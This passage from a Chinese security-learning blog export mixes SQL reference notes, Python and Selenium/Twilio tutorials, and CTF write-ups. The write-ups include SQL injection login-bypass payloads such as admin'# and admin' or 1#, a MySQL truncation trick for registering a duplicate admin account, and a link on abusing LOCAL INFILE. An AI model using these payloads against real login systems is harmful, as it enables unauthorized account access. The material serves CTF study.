    <content type="text"><![CDATA[LOAD DATA INFILEMySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。 1mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl; 如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。 你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。 两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。 如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。 123mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; INTO TABLE mytbl -&gt; FIELDS TERMINATED BY &apos;:&apos; -&gt; LINES TERMINATED BY &apos;\r\n&apos;; LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。 如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下： 12mysql&gt; LOAD DATA LOCAL INFILE &apos;dump.txt&apos; -&gt; INTO TABLE mytbl (b, c, a); 浅谈MySQL load data local infile细节 – 从源码层面mysql 的load data local infile命令如果在使用过程中出现提示： 1ERROR 1148 (42000): The used command is not allowed with this MySQL version 这种情况一般是由于MySQL限制了客户端导入本地文件的权限， 解决方案： MySQL远程导入数据LOAD DATA LOCAL INFILE …关于命令load data local infile 配置MySQL安全配置正餐一道CTF题目的学习 滥用 MySQL LOCAL INFILE 读取客户端文件: https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html]]></content>
      <categories>
        <category>Web安全</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo的Next主题实现二级categories]]></title>
    <url>%2F2018%2F04%2F25%2FHexo%E7%9A%84Next%E4%B8%BB%E9%A2%98%E5%AE%9E%E7%8E%B0%E4%BA%8C%E7%BA%A7categories%2F</url>
    <content type="text"><![CDATA[just like this 123categories: - 一级分类- 二级分类 注意一下-后面还有个空格]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DDL、DML、DCL的区别和理解]]></title>
    <url>%2F2018%2F04%2F25%2FDDL%E3%80%81DML%E3%80%81DCL%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[DML DML（data manipulation language）数据操纵语言： 数据操作语言，SQL中处理数据等操作统称为数据操纵语言 123456789101112131.SELECT - retrieve data from the a database 查询 2.INSERT - insert data into a table添加 3.UPDATE - updates existing data within a table 更新 4.DELETE - deletes all records from a table, the space for the records remain 删除 5.CALL - call a PL/SQL or Java subprogram 6.EXPLAIN PLAN - explain access path to data 7.LOCK TABLE - control concurrency 锁，用于控制并发 1234SELECT 列名称 FROM 表名称UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)DELETE FROM 表名称 WHERE 列名称 = 值 DDL DDL（data definition language）数据库定义语言： 数据定义语言，用于定义和管理 SQL 数据库中的所有对象的语言 1234567891011121314151.CREATE - to create objects in the database 创建 2.ALTER - alters the structure of the database 修改 3.DROP - delete objects from the database 删除 4.TRUNCATE - remove all records from a table, including all spaces allocated for the records are removed TRUNCATE TABLE [Table Name]。 5.COMMENT - add comments to the data dictionary 注释 6.GRANT - gives user&apos;s access privileges to database 授权 7.REVOKE - withdraw access privileges given with the GRANT command 收回已经授予的权限 12345678910111213CREATE TABLE 表名称(列名称1 数据类型,列名称2 数据类型,列名称3 数据类型,....)ALTER TABLE table_nameALTER COLUMN column_name datatypeDROP TABLE 表名称DROP DATABASE 数据库名称 DCL DCL（Data Control Language）数据库控制语言： 是用来设置或更改数据库用户或角色权限的语句，包括（grant,deny,revoke等）语句。这个比较少用到。 12345671.COMMIT - save work done 提交 2.SAVEPOINT - identify a point in a transaction to which you can later roll back 保存点 3.ROLLBACK - restore database to original since the last COMMIT 回滚 4.SET TRANSACTION - Change transaction options like what rollback segment to use 设置当前事务的特性，它对后面的事务没有影响 ​]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（2）：MySQL长字符截断]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9AMySQL%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[介绍：转载来自MySQL 字符截断攻击 先创建一张表 12345CREATE table users(id int(11) not NULL primary key auto_increment,username char(8) not NULL,password char(10) not NULL); 正常插入 admin ; admin insert into users(username,password) values(&#39;admin&#39;,&#39;admin&#39;); 超出字符限制插入(用户名长度为8): insert into users(username,password) values(&#39;admin &#39;,&#39;admin&#39;); insert into users(username,password) values(&#39;admin 1&#39;,&#39;admin&#39;); 超过位数的用户名会被截断 ,所以 ,admin 1 与 admin共存于一张表 select username from users where username = &#39;admin&#39;; 发现两个用户都被select出来 如果管理员的登录界面是这样判断的 : $sql = &quot;select count(*) from users where username = &#39;admin&#39; and password=&#39;任意&#39; &quot;; 那我们只需要注册一个账号为admin 1,password = &quot;任意&quot;, 就可以用admin登录 题目：https://ringzer0team.com/challenges/171 随手试了一下二次注入，发现有点不像于是进行长度截断注册 12username=admin 1#password=1 登录 12username=adminpassword=1 ####]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web安全，SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（1）：注释]]></title>
    <url>%2F2018%2F04%2F24%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E6%B3%A8%E9%87%8A%2F</url>
    <content type="text"><![CDATA[各个数据库的注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576OracleREM单行注释-- 单行注释/*多行注释*/ MS SQL Server-- 单行注释/*多行注释*/ MySQL#单行注释-- 单行注释（特别注意，-- 后有个空格！！！）/*多行注释*/ 总结：/*多行注释*/ 和-- 单行注释都差不多，MySQL要注意。非标准的#和REM最好还是不要用了为了兼容-- 后面最好都加空格MySQL注释的说明－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－‘--’作为注释起始标记一些其他SQL数据库采用“--”作为注释开始标志。MySQL服务器采用“#”作为注释起始字符。对于MySQL服务器，也能使用C风格的注释：/*该处为注释*/。请参见9.5节，“注释语法”。MySQL服务器3.23.3和更高版本支持“--”注释风格，但要求注释后面跟1空格（或控制字符，如新行）。之所以要求使用空格，是为了防止与自动生成SQL查询有关的问题，它采用了类似下面的代码，其中，自动为“!payment!”插入“payment”的值：UPDATE account SET credit=credit-!payment!考虑一下，如果“payment”的值为负数如“-1”时会出现什么情况：UPDATE account SET credit=credit--1在SQL中“credit--1”是合法的表达式，但是，如果“--1”被解释为注释开始，部分表达式将被舍弃。其结果是，表达式的意义与预期的意义完全不同。UPDATE account SET credit=credit该语句不会对值作任何更改！这表明，允许注释以“--”开始会产生严重后果。采用MySQL服务器3.23.3和更高版本中的这类注释方法，“credit--1”实际上很安全。另一个安全特性是，mysql命令行客户端将删除所有以“--”开头的行。仅当使用高于3.23.3的MySQL时，下述信息才有意义：如果有1个文本文件形式的SQL程序，该文件包含“--”注释，应按下述方式使用replace实用工具，将其转换为使用“#”字符的注释：shell&gt; replace &quot; --&quot; &quot; #&quot; &lt; text-file-with-funny-comments.sql \ | mysql db_name而不是通常的：shell&gt; mysql db_name &lt; text-file-with-funny-comments.sql你也可以编辑注释文件，将“--”注释更改为“#”注释：shell&gt; replace &quot; --&quot; &quot; #&quot; -- text-file-with-funny-comments.sql使用下述命令将其改回去：shell&gt; replace &quot; #&quot; &quot; --&quot; -- text-file-with-funny-comments.sql 题目：Most basic SQLi pattern.(point 1)12username: admin&apos;#password: 1 签到题，注释后面的password语句 解释： 如果后台的数据库语句是这样子的 1select * from user where username = '$username' and password = '$password' 输入之后，后面的password就被注释掉了，如果有admin的用户，就可以登录成功 1select * from user where username = 'admin'# and password = '1' ACL rulezzz the world.(point 2)随手测试 1username=admin&apos; 得到 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos;&apos; at line 4 随手闭合一下 1username=admin&apos; or 1# ###]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>转载,SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python合并Excel表格]]></title>
    <url>%2F2018%2F04%2F23%2FPython%E5%90%88%E5%B9%B6Excel%E8%A1%A8%E6%A0%BC%2F</url>
    <content type="text"><![CDATA[前言：因为有个同学问我有没有快速合并二十多个表格的方法，我说用Python，，， 然后，就有了下面的代码 #### 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/22 0:40# @Author : Lhaihai# @File : CombinedForm.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 合并文件夹的二十多个Excel"""import openpyxlimport openpyxl.cellfrom openpyxl.utils import get_column_letterimport osdef main(file_dir): for root, dirs, files in os.walk(file_dir): if(root != file_dir): continue print(root) #当前目录路径 print(dirs) #当前路径下所有子目录 print(files) #当前路径下所有非目录子文件 path = "xxxxxxxxxxx" wbmain = openpyxl.load_workbook(path + '数据导入模板.xlsx') sheetmain1 = wbmain['1.学生本人基本信息'] sheetmain2 = wbmain['2.学生家庭成员基本信息'] try: sheetmain3 = wbmain['3.学生本人干部任职信息'] except: print('Worksheet 3.学生本人干部任职信息 does not exist.') try: sheetmain4 = wbmain['4.论文'] # print(sheetmain4) except: print('Worksheet 4.论文 does not exist.') sheetmain5 = wbmain['5.评优'] try: sheetmain6 = wbmain['6.实习数据'] # print(sheetmain6) except: print('Worksheet 6.实习数据 does not exist.') sheetmain7 = wbmain['7.学生活动'] indexrow = [2,2,2,2,2,2,2] for file in files: if(file == '数据导入模板.xlsx'): continue print(path+file) wb = openpyxl.load_workbook(path+file) sheet1 = wb['1.学生本人基本信息'] print(sheet1.max_row) for i in range(2,int(sheet1.max_row)+1): if(not sheet1['A'+str(i)].value): continue for j in range(1,20): letter = get_column_letter(j) sheetmain1[letter+str(indexrow[0])] = sheet1[letter+str(i)].value print(sheetmain1[letter+str(indexrow[0])].value) indexrow[0]+=1 # sheet2 = wb['2.学生家庭成员基本信息'] # for i in range(2,int(sheet2.max_row)+1): # for j in range(1,14): # letter = get_column_letter(j) # sheetmain2[letter+str(indexrow[1])] = sheet2[letter+str(i)].value # print(sheetmain2[letter+str(indexrow[1])].value) # indexrow[1]+=1 try: sheet3 = wb['3.学生本人干部任职信息'] for i in range(2, int(sheet3.max_row) + 1): if (not sheet3['A' + str(i)].value): continue for j in range(1, 10): letter = get_column_letter(j) sheetmain3[letter + str(indexrow[2])] = sheet3[letter + str(i)].value print(sheetmain3[letter + str(indexrow[2])].value) indexrow[2] += 1 except: print(file+'Worksheet 3.学生本人干部任职信息 does not exist') try: sheet4 = wb['4.论文'] for i in range(2, int(sheet4.max_row) + 1): if (not sheet4['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain4[letter + str(indexrow[3])] = sheet4[letter + str(i)].value print(sheetmain4[letter + str(indexrow[3])].value) indexrow[3] += 1 except: print('Worksheet 4.论文 does not exist.') try: sheet5 = wb['5.评优'] for i in range(2, int(sheet5.max_row) + 1): if (not sheet5['A' + str(i)].value): continue for j in range(1, 8): letter = get_column_letter(j) sheetmain5[letter + str(indexrow[4])] = sheet5[letter + str(i)].value print(sheetmain5[letter + str(indexrow[4])].value) indexrow[4] += 1 except: print(file+'Worksheet 5.评优 does not exist.') try: sheet6 = wb['6.实习数据'] for i in range(2, int(sheet6.max_row) + 1): if (not sheet6['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain6[letter + str(indexrow[5])] = sheet6[letter + str(i)].value print(sheetmain6[letter + str(indexrow[5])].value) indexrow[5] += 1 except: print('Worksheet 6.实习数据 does not exist.') sheet7 = wb['7.学生活动'] for i in range(2, int(sheet7.max_row) + 1): if (not sheet7['A' + str(i)].value): continue for j in range(1, 9): letter = get_column_letter(j) sheetmain7[letter + str(indexrow[6])] = sheet7[letter + str(i)].value print(sheetmain7[letter + str(indexrow[6])].value) indexrow[6]+=1 wbmain.save(path+'example2.xlsx')if __name__ == '__main__': path= r'xxxxxx' main(path)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Postman使用]]></title>
    <url>%2F2018%2F04%2F23%2FPostman%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[介绍： 模拟各种HTTP requests 从常用的 GET、POST 到 RESTful 的 PUT 、 DELETE …等等。 甚至还可以发送文件、送出额外的 header。 Collection 功能（测试集合） Collection 是 requests的集合，在做完一個测试的時候， 你可以把這次的 request 存到特定的 Collection 里面，如此一來，下次要做同样的测试时，就不需要重新输入。而且一个collection可以包含多条request，如果我们把一个request当成一个test case，那collection就可以看成是一个test suite。通过collection的归类，我们可以良好的分类测试软件所提供的API.而且 Collection 还可以 Import 或是 Share 出來，让团队里面的所有人共享你建立起來的 Collection。 人性化的Response整理 一般在用其他工具來测试的時候，response的内容通常都是纯文字的 raw， 但如果是 JSON ，就是塞成一整行的 JSON。这会造成阅读的障碍 ，而 Postman 可以针对response内容的格式自动美化。 JSON、 XML 或是 HTML 都會整理成我们可以阅读的格式 内置测试脚本语言 Postman支持编写测试脚本，可以快速的检查request的结果，并返回测试结果 设定变量与环境 Postman 可以自由 设定变量与Environment，一般我们在编辑request，校验response的时候，总会需要重复输入某些字符，比如url，postman允许我们设定变量来保存这些值。并且把变量保存在不同的环境中。比如，我們可能会有多种环境， development 、 staging 或 local， 而这几种环境中的 request URL 也各不相同，但我们可以在不同的环境中设定同样的变量，只是变量的值不一样，这样我们就不用修改我们的测试脚本，而测试不同的环境。 下载地址：因为2018年初Chrome禁止了Postman，但我刚才使用的时候是可以再Chrome浏览器使用的。然而还是有个提示建议用本地客户端。 所以放出官网下载链接 https://www.getpostman.com/postman 可以使用google账号直接登录 使用： 官方文档https://www.getpostman.com/docs/v6/]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
      <tags>
        <tag>web,tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3实现hetianlab自动签到并且发短信到手机]]></title>
    <url>%2F2018%2F04%2F17%2Fhetianlab%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E5%B9%B6%E4%B8%94%E5%8F%91%E7%9F%AD%E4%BF%A1%E5%88%B0%E6%89%8B%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[首发合天，禁止转载0x00 前言​ 这几天学了学python爬虫，就想用python实现一下自动签到领取积分，毕竟我比较懒，能不动手就让代码去做吧，☺。 0x01 安装环境python 需要用到的库12pip install selenium #模拟浏览器行为的库pip install twilio #发送短信 安装ChromeDriverChromeDriver是Chrome浏览器的自动化测试工具 1、先查看Chrome浏览器的版本 点击 Chrome 的菜单，帮助-&gt;关于 Chrome，即可查看 Chrome 的版本号 这里我的版本号是65.0 2、下载ChromeDriver 官方下载链接： https://sites.google.com/a/chromium.org/chromedriver/downloads 这里我就下载 ChromeDriver 2.37 3、配置环境变量 Windows下，直接把ChromeDriver .exe 放在Python的 Scripts目录下 Linux和Mac也是一样把文件移动到属于环境变量的目录里或者将可执行文件配置到环境变量。 例如下面移动文件到 /usr/bin 目录，首先进入其所在路径，然后将其移动到 /usr/bin： 1sudo mv chromedriver /usr/bin 4、测试一下哈 在命令行输入 chromedriver ，如果有类似输出就说明chromedriver 的环境变量配置好了 然后再写代码测试一下 12from selenium import webdriverbrowser = webdriver.Chrome() 运行，会弹出Chrome浏览器，就可以开始写登录代码了。 0x02 登录hetianlabselenium是什么官方的话：selenium一个Web应用程序测试的工具，而且Selenium测试直接运行在浏览器中，就像真正的用户在操作一样 简单的说，就是我们可以用selenium来控制浏览器然后完成一系列操作，比如打开某个网页，点击超链接、按钮，在文本框输入字符，获取网页的内容，模拟鼠标操作（右键，双击） Selenium 支持非常多的浏览器，如 Chrome、Firefox、Edge等，最新版本的Selenium已经不支持无界面浏览器PhantomJS，但是Chrome和Firefox已经支持无界面。 我们可以用下面的方式初始化一个浏览器对象 1234567from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.PhantomJS()browser = webdriver.Safari() 设置Chrome浏览器无界面： 1234567from selenium import webdriverfrom selenium.webdriver.chrome.options import Options #导入Optionschrome_options = Options()chrome_options.add_argument('--headless') #无界面模式chrome_options.add_argument('--disable-gpu') #Windows平台需要加上browser = webdriver.Chrome(chrome_options=chrome_options) #把无界面设置导入 想要了解更多，可以查看官方文档：https://developers.google.cn/web/updates/2017/04/headless-chrome 打开一个网页Selenium提供了get()方法来访问网页 123456from selenium import webdriverbrowser = webdriver.Chrome()browser.get('https://www.baidu.com') #打开百度print(browser.page_source)browser.close() selenium怎么获取网页信息获取节点selenium获取节点（节点可以理解是网页的按钮，输入框等，学过HTML的同学知道其实它就是一个标签或者标签里面的内容、属性）的方法很多，下面是获取单个节点的方法，返回的是WebElement 类型 12345678find_element_by_idfind_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector 想获取多个节点的话，就是element后面加上s 例如：find_elements_by_id 查找多个节点函数返回的结果是一个列表，列表的每个节点是WebElement 类型 节点交互输入文字用 send_keys() 方法，清空文字用 clear() 方法，另外按钮点击用 click() 方法。例如： 12phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名 获取节点信息WebElement 类型有相关的方法和属性来直接提取节点信息，如属性、文本等等 123456input = browser.find_element_by_by_id('userEmail')print(input.get_attribute('class') #获取class的名字print(input.id) #获取idprint(input.location) #location 可以获取该节点在页面中的相对位置 print(input.tag_name) #tag_name 可以获取标签名称print(input.size) #size 可以获取节点的大小 知识点介绍好了，开始实战，打开我们要签到的首页，F12 -&gt;点一下左边的小箭头-&gt;再点输入手机的文本框-&gt;就会显示出文本框的信息来。查看发现它的id是userEmail，就可以通过id来获取这个节点。 密码框和登录按钮也是如此，类似操作拿到密码框的id是 passwordIn，登录按钮的id是registButIn。 于是我们初步的代码已经出来了。 version 1.0这是第一个版本， 12345678910111213141516from selenium import webdriverimport timeUsername = 'xxxxxxxxx' #登录的手机号码Password = 'xxxxxxxxxx' #密码loginUrl = 'http://www.xxxxxx.com/loginLab.do' #xxxxxx登录网址browser = webdriver.Chrome()browser.maximize_window() #浏览器最大化browser.get(loginUrl) #Chrome浏览器打开登录页面phonenumber = browser.find_element_by_id('userEmail') #通过id捕获到用户名输入框phonenumber.send_keys(Username) #在用户名文本框输入用户名password = browser.find_element_by_id('passwordIn') #通过id捕获到密码输入框password.send_keys(Password) #在密码框输入密码siginbutton = browser.find_element_by_id('registButIn') #捕获到登录按钮 siginbutton.click() #点击登录按钮time.sleep(3) #暂停3sbrowser.close() #关闭浏览器 运行，试了几次竟然都成功登录了 :-( 我之前测试的时候，老是没有登录成功，原因是 登录按钮没有获取到，就算暂停了程序(time.sleep())等一等还是有这个问题。所以我就写了个函数来检查登录按钮是否获取成功 1234567891011121314151617def isFindElement(element): # print('check:') # print(element) if element: #如果捕获到元素，就返回true，否则返回false return True else: return False def SignIn() #略略略 #----- siginbutton = browser.find_element_by_id('registButIn') while(not isFindElement(siginbutton)): #循环判断登录按钮是否获取成功，成功就退出 time.sleep(0.5) print('signin-false') siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() 之前测试的时候，check起码打印两次 :-( ， 但是想到这个方法的估计也就像我一样是个不怎么了解selenium的新手 后来了解到 selenium的等待，赶紧优化一下 version 2.0介绍两个新概念 selenium 的隐性等待和显性等待 隐性等待隐形等待是设置了一个最长等待时间，如果在规定时间内网页加载完成，则执行下一步，否则一直等到时间截止，然后执行下一步。 1implicitly_wait(10) #等待10s 温馨提示：隐性等待在整个driver的周期都起作用，所以只要设置一次即可显性等待WebDriverWait，配合该类的until()和until_not()方法，就可以根据判断条件而进行灵活地等待了。 它主要的意思就是：程序每隔xx秒看一眼，如果条件成立了，则执行下一步，否则继续等待，直到超过设置的最长时间，然后抛出TimeoutException。 代码具体什么意思可以去看一下手册，这里我们只要会调用就好了。 123456789101112131415from selenium.webdriver.support.wait import WebDriverWait #导入了新的库from selenium.webdriver.support import expected_conditions as EC #导入了新的库from selenium.webdriver.common.by import By #导入了新的库 def SignIn() #省略十万行代码 locator = (By.ID, 'registButIn') #通过id发现的登录按钮 try: #等待30s，默认0.5s检查一次是否捕获到登录按钮 WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") 温馨提示：最长等待时间取决于隐性等待和显性等待的最大值。上面例子为30s，如果隐性等待时间大于显性等待时间，那么最长等待时间就是隐性等待时间 顺便包装为函数方便调用，添加上获取合氏币的代码，前面为了方便测试就没有设置为无界面模式，现在可以设置为无界面模式了version 2.0 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/17 12:55# @Author : Lhaihai# @File : # @Software: PyCharm""" Description : 自动登录，签到一下，并且拿到自己当前积分有多少，最后发送短信给手机"""from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By import timechrome_options = Options()chrome_options.add_argument('--headless')chrome_options.add_argument('--disable-gpu')def SignIn(Username,Password): loginUrl='http://www.xxxxxxx.com/loginLab.do' browser = webdriver.Chrome(chrome_options=chrome_options) #设置为无界面模式 browser.maximize_window() browser.implicitly_wait(10) #隐性等待10s browser.get(loginUrl) phonenumber = browser.find_element_by_id('userEmail') phonenumber.send_keys(Username) password = browser.find_element_by_id('passwordIn') password.send_keys(Password) locator = (By.ID, 'registButIn') try: WebDriverWait(browser,30).until(EC.presence_of_element_located(locator)) #显性等待30s siginbutton = browser.find_element_by_id('registButIn') siginbutton.click() print('登录按钮点击成功') except: print("registButIn can't find") time.sleep(3) #signImg捕获用户头像，没错就是头像，其实把鼠标放到头像上就会显示我的主页，selenium也有模拟鼠标操作的，那就是ActionChains，这里简单起见就直接使用.click()了 signImg = browser.find_element_by_class_name('siLg-img') signImg.click() #点击 myindex = browser.find_element_by_link_text('我的主页') myindex.click() #点击我的主页 heshibi = browser.find_elements_by_class_name('allNum') #获得登录次数和积分数量 Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].text print(Msg) browser.close() if __name__ == '__main__': SignIn('username','password') #填写你的用户名和密码 0x03 发送短信​ 这时候我们已经可以成功登录并且拿到自己账号积分的数量。接下来我们进行最后一步，发送短信到自己手机上。 1、注册Twilio账号访问http://twilio.com/（需要自备梯子）填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。 现在，就可以用twilio模块向这个电话号码发送短信了。 2、获取一个Twilio电话号码：我在Dashboard找了好久没发现Phone的选项，后来翻了翻官方教程https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/，然后点里面的链接打开 :-( 。 其实你可以用右上角的UPGRADE搜索框搜索，或者直接打开这个网址 https://www.twilio.com/console/phone-numbers/getting-started 挑一个地区和号码，确定。恭喜你，获得一个免费的电话号码了。 3、要验证接收短信的手机号码，要不然就会出现下面的报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 在Verified 验证手机号码 可以发送短信验证码或者接受电话获得验证码 4、正式发送短信从官方文档 https://www.twilio.com/docs/libraries/python 拿到下面代码 123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", #接收短信的手机 from_="+15017250604", #自己twilio的号码 body="Hello from Python!") #短信的内容print(message.sid) 只需要把 auth_tocken 和from_换成自己的，再修改一下to和body auth_tocken : 打开Dashboard，加密的就是你的auth_tocken message 的from_ 填上你的twilio手机号码，虽然你选择号码的时候看起来是这样子：+1(855) 912-6770 (这个号码是我重新去twilio买电话号码那随机拿的一个，并不是我的:） )但是最后你会获得一个号码：类似+15017250604 ， 运行一下，就可以收到短信了，短信的号码是会换了，玩多了你就发现自己手机一大片都是twilio的短信 最后封装一下函数，类似下方， 12345678910111213141516from twilio.rest import Clientdef sendMessage(toPhoneNumber,Msg): # Your Account SID from twilio.com/console account_sid = "AC9810ae2342f0014cd05e338bce9be8cb" # Your Auth Token from twilio.com/console auth_token = "your_auth_token" client = Client(account_sid, auth_token) message = client.messages.create( to='+86'+toPhoneNumber, #接收短信的手机 from_="+15017250604", #自己twilio的号码 body=Msg) #短信的内容 print(message.sid) 我保存为twilioToMyPhone.py，放到python.exe 当前目录下 以后想发送短信就直接调用： 12import twilioToMyPhonetwilioToMyPhone.sendMessage('phonenumber',Msg) 5、在version 2.0 加上发送短信的代码在开头导入库 1import twilioToMyPhone 在browser.close() 之前，Msg = &#39;&#39;签到成功......&#39;之后加上发送短信的一句代码 123Msg = '签到成功\n登录次数:' + heshibi[0].text + ',积分：' + heshibi[1].texttwilioToMyPhone.sendMessage('phonenumber',Msg)browser.close() 差不多大功告成了，就算可以一键登录，不用手动打开浏览器，我还是想跟懒一点 :） 最后一步，设置每天自动启动py tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在import twilio库的时候会失败， 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3：github项目 https://github.com/twilio/twilio-python/ 0x04 设置每天自动启动python.bat 运行python问题来了，想要运行python代码，总不能启动pycharm然后点击运行吧 ，所以使用DOS命令来运行python代码 而.bat 是 windows的批处理文件，可以双击.bat文件来运行我们的python代码 具体什么意思么，.py文件不能像exe一样双击运行，但是.bat文件可以，这是为了方便我们下一步的任务启动器 类似下图， 这里有个坑，当你原原本本按照上图打好了每一个字符，双击.bat ，却发现没有成功运行（收到短信） 然后复制python F:\CodeDevelopment\PythonDevelopment\hetianLabSignin.py 到DOS，发现有个方框在 F:\前面，去掉方框，再从DOS复制这条代码到.bat文件，就可以运行了。或者直接先在DOS敲好这句代码，然后复制到.bat。 当然，顺便运行看看能不能正常启动，类似下图就是成功了，但DOS会跳出一些INFO，目前还不知道为什么 任务计划程序当当当，最最后一步，设置自动启动 不同操作系统都有自己的任务计划程序 Windows ：任务计划程序， Linux： Cron Mac ： Launchd 以Windows 10 为例子： 1、打开任务计划程序，直接搜索就好了，win+s弹出搜索框(开着小娜的话电脑CPU利用率一直挺高，关了就好很多了)，然后输入任务计划程序 2、点击右边的创建任务 3、名字自己随便取吧，触发器-&gt;新建-&gt; 设置每天某个时候启动， 但是如果我那个时候电脑没有开启呢？可以在设置勾上 ‘如果过了计划开始时间，立即启动任务’ 4、最重要的操作来了，新建操作-&gt;浏览选上测试好的bat 5、乖巧等待它自动运行 0x05 后记或许有大佬想问了，为啥不用request，而这么麻烦的用selenium。 我是学习了selenium后，想要练练手，仅此而用。 简单尝试了下request 123456789import requestsdatas=&#123; 'username':'xxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'&#125;r= requests.get('http://www.xxxxx.com/loginLab.do',data=datas)print(r.text) 直接在登录页面post没成功，抓包发现 先是Post一个去/getRsaOfKey.action 返回一些字符串 接着 才是真的 POST /Login.action 发现它post过去的密码是经过加密了的，而且还POST了两个认证参数 1&amp;validateCode=&amp;rtnJson=true 所以我们构造POST的data为 123456datas=&#123; &apos;username&apos;:&apos;xxxxxxxxxxxx&apos;, &apos;password&apos;:&apos;xxxxxxxxxxxxxxxxxxxxxxxxx&apos;, 